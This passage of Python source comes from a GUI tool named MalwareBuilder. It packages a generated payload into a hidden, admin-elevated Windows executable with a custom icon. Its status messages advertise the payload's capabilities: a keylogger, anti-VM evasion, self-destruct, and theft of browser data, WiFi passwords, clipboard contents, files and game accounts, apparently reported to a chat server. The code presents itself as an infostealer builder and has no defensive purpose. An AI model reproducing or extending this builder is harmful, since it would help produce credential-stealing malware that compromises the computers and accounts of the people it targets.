                f"The generated payload has a syntax error:\n\n{msg}\n\n"
                f"The .py file has been kept at:\n{py_path}")
            return
        self.log(f"Payload syntax: {msg}", "success")

        if fmt == ".exe":
            exe_path = os.path.join(OUTPUT_DIR, f"{name}.exe")
            work_dir = os.path.join(OUTPUT_DIR, "_build_temp")
            os.makedirs(work_dir, exist_ok=True)

            icon_flag = []
            temp_ico = None
            if self.icon_path:
                ico = icon_to_ico(self.icon_path)
                if ico:
                    temp_ico = os.path.abspath(ico)
                    icon_flag = ["--icon", temp_ico]
                    self.log(f"Icon applied: {os.path.basename(ico)}", "info")
                else:
                    self.log("Icon conversion failed.", "warn")

            self.log("Running PyInstaller (60-180s)...", "info")
            self.root.update_idletasks()

            try:
                cmd = [
                    sys.executable, "-m", "PyInstaller",
                    "--onefile", "--noconsole", "--uac-admin",
                    "--distpath", os.path.abspath(OUTPUT_DIR),
                    "--workpath", os.path.abspath(work_dir),
                    "--specpath", os.path.abspath(work_dir),
                    "--name", name,
                    "--collect-all", "requests",
                    "--collect-all", "urllib3",
                    "--collect-all", "chardet",
                    "--collect-all", "certifi",
                    "--collect-all", "idna",
                ] + icon_flag
                for dep in PAYLOAD_DEPS:
                    cmd.extend(["--hidden-import", dep])
                cmd.append(os.path.abspath(py_path))

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=240)
                if result.returncode != 0:
                    err = (result.stderr or result.stdout or "Unknown error")[-700:]
                    self.log(f"PyInstaller FAILED (code {result.returncode})", "error")
                    self.log(f"  {err[:400]}", "error")
                    shutil.rmtree(work_dir, ignore_errors=True)
                    messagebox.showerror("Build Failed",
                        f"PyInstaller error (code {result.returncode}):\n\n{err}\n\n.py kept at:\n{py_path}")
                    return

                if not os.path.exists(exe_path):
                    self.log("PyInstaller ran but no .exe produced.", "error")
                    shutil.rmtree(work_dir, ignore_errors=True)
                    messagebox.showerror("Build Failed",
                        f"PyInstaller ran but no .exe produced.\n.py kept at:\n{py_path}")
                    return

                shutil.rmtree(work_dir, ignore_errors=True)
                if temp_ico and os.path.exists(temp_ico):
                    os.remove(temp_ico)
                os.remove(py_path)

                exe_size = os.path.getsize(exe_path)
                size_str = f"{exe_size:,}B" if exe_size < 1024 else f"{exe_size/1024:.1f}KB" if exe_size < 1048576 else f"{exe_size/1048576:.1f}MB"
                self.log(f"BUILD SUCCESS! {exe_path} ({size_str})", "success")
                self.log(f"Features: {enabled_count} | Keylogger: {'Yes' if has_keylogger else 'No'} | Anti-VM: {'Yes' if has_anti_vm else 'No'} | Self-Destruct: {'Yes' if has_self_destruct else 'No'}", "info")
                messagebox.showinfo("Built! ⚡",
                    f"v7.4 .exe ready:\n{exe_path}\n\n"
                    f"Size: {size_str}\nFeatures: {enabled_count}\n"
                    f"Keylogger: {'Yes' if has_keylogger else 'No'}\n"
                    f"Anti-VM: {'Yes' if has_anti_vm else 'No'}\n"
                    f"Self-Destruct: {'Yes' if has_self_destruct else 'No'}\n\n"
                    f"New v7.4:\n"
                    f"• 15 browsers (Kometa, Orbitum, Yandex, etc.)\n"
                    f"• WiFi passwords, Clipboard, Common Files\n"
                    f"• Games (Minecraft + Epic), Anti-VM, Self-Destruct\n"
                    f"• Anti-Spam mutex, Ping @everyone/@here")
            except subprocess.TimeoutExpired:
                self.log("PyInstaller timed out (240s).", "error")
                shutil.rmtree(work_dir, ignore_errors=True)
                messagebox.showerror("Timeout", f"PyInstaller timed out.\n.py kept at:\n{py_path}")
            except Exception as e:
                self.log(f"Unexpected error: {e}", "error")
                shutil.rmtree(work_dir, ignore_errors=True)
                messagebox.showerror("Error", f"Unexpected: {e}\n\n.py kept at:\n{py_path}")
        else:
            self.log(f"BUILD SUCCESS! {py_path}", "success")
            self.log(f"Features: {enabled_count} | Keylogger: {'Yes' if has_keylogger else 'No'}", "info")
            messagebox.showinfo("Built! ⚡",
                f".py payload ready:\n{py_path}\n\n"
                f"Features: {enabled_count}\n"
                f"Run with: python {name}.py")

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    MalwareBuilder().run()